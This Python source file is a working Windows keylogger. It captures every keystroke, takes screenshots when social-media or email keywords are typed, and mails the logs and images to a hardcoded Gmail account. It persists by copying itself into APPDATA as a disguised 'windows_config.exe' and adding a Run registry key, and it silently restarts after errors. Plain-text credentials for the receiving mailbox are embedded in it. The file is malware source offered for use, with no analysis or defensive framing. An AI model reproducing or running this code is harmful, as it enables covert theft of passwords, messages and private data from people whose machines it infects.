from pynput import keyboard
import threading , smtplib , os , sys , time , getpass , platform , subprocess
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

ss_for = ["facebook","gmail","email","instagram","twitter"]

class logger() :
    
    def __init__(self,email,password,time) :
        username = getpass.getuser()
        system = platform.uname()
        if system[0] == 'Darwin' :
            os_name = "Mac os"
        else :
            os_name = system[0]
        sysinfo = "Username : "+username+"\nOs : "+system[0]+" --> "+os_name+"\nversion : "+system[3]+"\nProcessor : "+system[5]+"\nmachine : "+system[4]+"\nNode : "+system[1]
        self.message = "\n\n Keylogger started \n\n"+sysinfo
        self.send_message = " "
        self.email = email
        self.password = password
        self.time = time
        self.listener = keyboard.Listener(on_press = self.on_press)
        self.captured = 0 

    def send_mail(self) :
        try :
            server = smtplib.SMTP("smtp.gmail.com",587)
            server.starttls()
            server.login(self.email,self.password)
            server.sendmail(self.email,self.email,self.send_message+self.message)
            server.quit()
        except :
            sys.exit()
            
    def send_mail_with_image(self) :
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "Image Report of the keylogger"
        body = self.send_message
        msg.attach(MIMEText(body, 'plain'))
        filename = "image"+str(self.captured)+".png"
        path = os.environ.get('APPDATA')
        path = path+"\\"+filename
        attachment = open(path, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(self.email, self.password)
        text = msg.as_string()
        s.sendmail(self.email, self.email, text)
        s.quit()
        return path
        
    def report(self) :
        if self.captured != 0 : # Use while when using high frequency refresh rate
            path = self.send_mail_with_image()
            os.remove(path)
            self.captured -= 1
            self.send_message = "\n\n"
        if self.captured == 0 :
            self.send_mail()
            self.send_message = "\n\n"
            self.message = "\n\n"
            timer = threading.Timer(self.time,self.report)
            timer.start()

    def on_press(self,key) :
        try :
            self.message += key.char
        except AttributeError :
            if key == key.space :
                self.message += " "
            elif key == key.tab :
                self.message += "    "
            elif key == key.enter :
                self.message += "\n"
            elif key == key.backspace :
                self.message += "\b"
            else :
                self.message += " "+str(key)+" "
                
    def checkwords(self) :
        global ss_for
        if any(x in self.message for x in ss_for) :
            capture = ImageGrab.grab()
            path = os.environ.get('APPDATA')     
            self.captured += 1
            image_name = "\\image"+str(self.captured)+".png"
            final_path = path+image_name
            capture.save(final_path)
            self.send_message += self.message
            self.message = "\n\n"
        timer = threading.Timer(5,self.checkwords)
        timer.start()

    def change_location(self) :
        path = os.environ.get('APPDATA')
        path += "\\windows_config.exe"
        if not os.path.exists(path) :
            f = open(os.devnull,"wb")
            cmd = ["copy",sys.executable,path]
            subprocess.run(cmd,shell=True,stdout=f,stderr=f,stdin=f)
            f.close()
        else :
            return
        
    def persistance(self) : # Make two functions one for the windows and other for the linux based os
        # print("\nPersistance activated !! \n")
        path = os.environ.get('APPDATA')
        path += "\\windows_config.exe"
        if not os.path.exists(path) :
            self.change_location()
            f = open(os.devnull,"wb")
            subprocess.run('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsconf /t REG_SZ /d "' + path + '"', shell=True,stdout=f,stdin=f,stderr=f)
            f.close()
        else :
            return
                
    def run_logger(self) :
        try :
            self.persistance()
        except Exception as e:
            pass
        self.checkwords()
        self.report()
        self.listener.start()


def rerun(logger_object) :          
    try :
        logger_object.run_logger()
    except Exception as e:
        # print(e)
        logger_object = logger("budies000@gmail.com","bizmAx-hozdaq-7vypso",20) 
        time.sleep(10)
        rerun(logger_object)

if __name__ == '__main__' :
    try :
        logger_object = logger("budies000@gmail.com","bizmAx-hozdaq-7vypso",20)
        rerun(logger_object)
    except Exception as e :
        # print(e)
        sys.exit()























